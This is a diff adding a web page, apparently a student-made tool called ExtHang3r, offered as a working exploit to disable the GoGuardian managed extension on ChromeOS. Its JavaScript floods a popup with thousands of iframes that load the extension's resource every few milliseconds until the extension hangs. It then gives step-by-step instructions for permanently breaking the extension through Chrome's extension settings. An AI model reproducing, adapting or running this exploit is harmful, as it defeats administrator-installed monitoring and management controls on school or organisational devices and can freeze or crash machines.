@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ExtHanger by Ian</title>
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/refs/heads/main/favicon.png" type="image/png" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+    <style>
+      body {
+        font-family: 'Inter', sans-serif;
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(135deg, #121212, #1e1e1e);
+        color: #f1f1f1;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      header {
+        background: rgba(255, 255, 255, 0.05);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        color: #fff;
+        padding: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .logo {
+        width: 40px;
+        height: 40px;
+        margin-right: 10px;
+      }
+
+      h1 {
+        font-size: 1.6rem;
+        font-weight: 600;
+        margin: 0;
+      }
+
+      .container {
+        max-width: 700px;
+        width: 90%;
+        margin: 80px auto 20px auto;
+        background: rgba(255, 255, 255, 0.04);
+        border-radius: 16px;
+        padding: 30px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
+      }
+
+      label {
+        display: block;
+        margin-top: 20px;
+        margin-bottom: 10px;
+        font-weight: 600;
+        color: #ccc;
+      }
+
+      select, input[type="range"] {
+        width: 100%;
+        padding: 12px;
+        background: #1f1f1f;
+        border: 1px solid #444;
+        border-radius: 8px;
+        color: #fff;
+        font-size: 15px;
+      }
+
+      button {
+        width: 100%;
+        padding: 14px;
+        margin-top: 20px;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+        background: linear-gradient(135deg, #0061ff, #60efff);
+        color: #fff;
+        font-weight: 600;
+        cursor: pointer;
+        transition: 0.3s ease;
+      }
+
+      button:hover {
+        opacity: 0.9;
+      }
+
+      #killButton {
+        background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      }
+
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        background-color: rgba(0, 0, 0, 0.8);
+        z-index: 9999;
+        color: #fff;
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .spinner {
+        border: 6px solid rgba(255, 255, 255, 0.3);
+        border-top: 6px solid #fff;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      #iframeCountValue {
+        text-align: right;
+        margin-top: 8px;
+        color: #999;
+      }
+
+      #killExtensionText {
+        margin-top: 30px;
+        padding: 20px;
+        border-radius: 12px;
+        background: rgba(255, 255, 255, 0.08);
+        color: #eee;
+        font-size: 16px;
+        display: none;
+      }
+
+      footer {
+        margin-top: auto;
+        background: rgba(255, 255, 255, 0.03);
+        text-align: center;
+        padding: 12px;
+        font-size: 14px;
+        color: #aaa;
+      }
+
+      footer a {
+        color: #60efff;
+        text-decoration: none;
+      }
+
+      footer a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img src="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/refs/heads/main/favicon.png" alt="Logo" class="logo">
+      <h1>ExtHanger by Ian</h1>
+    </header>
+
+    <div class="container">
+      <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of February 2025.</p>
+      <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
+      <select id="iframeSelect"></select>
+      <label for="iframeCountSlider" id="labelForIframeSlider">The slider below changes the amount of iframes that will be created. Try it with the default first, and if the extension comes back after a few minutes increase it and try again. Tip: If your computer crashes or freezes for more than 2 minutes, you should definitely decrease the amount of iframes.</label>
+      <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100">
+      <div id="iframeCountValue">3000</div>
+      <button onclick="warning();" id="hangButton">Step 1: Hang Extension (Temporarily Freeze)</button>
+<p style="margin-top: 10px; font-size: 14px; color: #bbb;">This will temporarily freeze the extension by overloading it with thousands of iframe requests. Keep the popup open for at least 30 minutes to increase effectiveness.</p>
+      <button id="killButton" onclick="openExtensionPopup();">Step 2: Kill Extension (Permanently Disable)</button>
+<p style="margin-top: 10px; font-size: 14px; color: #bbb;">After the extension has been hanged, this step guides you to Chrome's settings to permanently break it until reinstalled or manually fixed.</p>
+      <div id="killExtensionText"></div>
+    </div>
+
+    <div class="overlay" id="overlay">
+      <div class="spinner"></div>
+      Hanging... (This will take about 1 minute)
+    </div>
+
+    <footer>
+      <p>Made by <a href="https://github.com/Blobby-Boi/" target="_blank">Blobby Boi</a></p>
+    </footer>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const slider = document.getElementById("iframeCountSlider");
+        const sliderValueDisplay = document.getElementById("iframeCountValue");
+        const deviceMemory = navigator.deviceMemory || 8;
+        const defaultIframeCount = Math.round(deviceMemory * 500);
+        const maxIframeCount = Math.round(deviceMemory * 10000);
+        slider.value = defaultIframeCount;
+        slider.max = maxIframeCount;
+        sliderValueDisplay.textContent = defaultIframeCount;
+        slider.addEventListener("input", function() {
+          sliderValueDisplay.textContent = this.value;
+        });
+      });
+
+      async function checkExtensionURL(url) {
+        try {
+          const response = await fetch(url);
+          return response.ok;
+        } catch {
+          return false;
+        }
+      }
+
+      async function populateSelectOptions() {
+        const selectElement = document.getElementById("iframeSelect");
+        const extensions = {
+          "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
+        };
+        let hasSupportedExtensions = false;
+        for (const [name, url] of Object.entries(extensions)) {
+          if (await checkExtensionURL(url)) {
+            const option = document.createElement("option");
+            option.value = url;
+            option.textContent = name;
+            selectElement.appendChild(option);
+            hasSupportedExtensions = true;
+          }
+        }
+        if (!hasSupportedExtensions) {
+          const option = document.createElement("option");
+          option.value = "";
+          option.textContent = "No supported extensions installed";
+          selectElement.appendChild(option);
+          document.getElementById("hangButton").style.display = "none";
+          document.getElementById("iframeCountSlider").style.display = "none";
+          document.getElementById("iframeCountValue").style.display = "none";
+        }
+      }
+      populateSelectOptions();
+
+      function replaceIframes(container, iframeSrc, iframeCount) {
+        for (let i = 0; i < iframeCount; i++) {
+          const iframe = document.createElement('iframe');
+          iframe.src = iframeSrc;
+          iframe.style.width = '100%';
+          iframe.style.height = '100px';
+          container.appendChild(iframe);
+        }
+        setTimeout(function() {
+          while (container.firstChild) {
+            container.removeChild(container.firstChild);
+          }
+          replaceIframes(container, iframeSrc, iframeCount);
+        }, 5);
+      }
+
+      function warning() {
+        const overlay = document.getElementById("overlay");
+        overlay.style.display = "flex";
+        const iframeSelect = document.getElementById("iframeSelect");
+        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+        const selectedSrc = iframeSelect.value;
+        const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
+        const popup = window.open("", "PopupWindow", "width=100,height=100");
+        const popupDocument = popup.document;
+        const popupBody = popupDocument.body;
+        const iframeContainer = popupDocument.createElement('div');
+        iframeContainer.id = 'iframeContainer';
+        popupBody.appendChild(iframeContainer);
+        replaceIframes(iframeContainer, selectedSrc, iframeCount);
+
+        setTimeout(function() {
+          popup.close();
+          const killExtensionText = document.getElementById("killExtensionText");
+          killExtensionText.innerHTML = "Now that the extension  <strong> " + selectedOption + " </strong> has been hanged, press the button above.";
+          setTimeout(function() {
+            overlay.style.display = "none";
+            killExtensionText.style.display = "block";
+            document.getElementById("killButton").style.display = "inline-block";
+            document.getElementById("hangButton").style.display = "none";
+            document.getElementById("iframeSelect").style.display = "none";
+            document.getElementById("iframeCountSlider").style.display = "none";
+            document.getElementById("iframeCountValue").style.display = "none";
+            document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+          }, 10000);
+        }, 1800000); // 30 minutes
+      }
+
+      function openExtensionPopup() {
+        const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
+        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+        const killExtensionText = document.getElementById("killExtensionText");
+        document.getElementById("killButton").style.display = "none";
+        killExtensionText.innerHTML = "Make sure to keep this tab open. Then open  <strong> chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
+        window.location.href = selectedSrc;
+      }
+    </script>
+  </body>
+</html>
